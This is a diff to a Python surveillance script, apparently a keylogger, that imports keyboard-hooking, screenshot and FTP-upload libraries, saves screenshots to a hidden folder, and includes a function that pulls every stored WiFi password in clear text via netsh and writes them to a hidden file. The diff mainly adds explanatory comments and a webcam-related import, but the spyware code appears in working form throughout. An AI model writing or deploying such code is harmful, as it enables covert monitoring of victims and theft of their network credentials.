@@ -1,4 +1,4 @@
-import pyHook, pythoncom, os, getpass, time, subprocess, re
+import pyHook, pythoncom, os, getpass, time, subprocess, re, cv2
 from PIL import ImageGrab
 from ftplib import FTP  # for uploading the file to an FTP server
 from datetime import datetime
@@ -19,29 +19,33 @@ screenshotpath = (r'C:\Hidden\Screenshots\\' + currentuser)
 if not os.path.exists(screenshotpath):
     os.makedirs(screenshotpath)
 
+
 def pastWiFiHarvest():
 
-    passwords = dict()
-    netshOutput = subprocess.check_output("netsh wlan show profile", shell=True).split('\n')
-    Names = list()
+    passwords = dict()  # Create dictionary to store SSID / password combos
+    netshOutput = subprocess.check_output("netsh wlan show profile", shell=True).split('\n')  # Get stored WiFi profiles
+    Names = list()  # Create a list to hold SSID names
 
-    for name in netshOutput:
-        name = name.split(':')
+    for line in netshOutput:
+        line = line.split(':')  # Split the output of the netsh command to isolate the SSID name
         try:
-            Names.append(name[1].strip())
+            Names.append(line[1].strip())  # If a name existed, add it to the list of names
         except:
-            pass
-    for x in Names:
+            pass  # Do nothing if a name didn't exist
+    for SSID in Names:
         try:
-            output = subprocess.check_output("netsh wlan show profile name=" + x + " key=clear", shell=True)
+            # Get a detailed netsh output for each SSID, with the key in clear text.
+            output = subprocess.check_output("netsh wlan show profile name=" + SSID + " key=clear", shell=True)
+            # Use regular expressions to strip out just the key
             output = re.findall('Key Content(.*)\n', output)[0].strip().split(':')[1].strip()
-            passwords[x] = output
+            passwords[SSID] = output  # Create the SSID as a dictionary key with the password as the value
         except:
-            pass
+            pass  # Do nothing if no password is found
+
     PassDoc = open('C:\\Hidden\\Past_WiFi_Passwords_' + currentuser + '.txt', 'a+')
     for x in passwords:
         PassDoc.write("SSID = " + x + "\nPassword = " + passwords[x] + "\n\n")
-    PassDoc.close()
+    PassDoc.close()  # Create a new text file and write the SSID / password combos to it.
 
 def TakeScreenshot():
     global currentuser
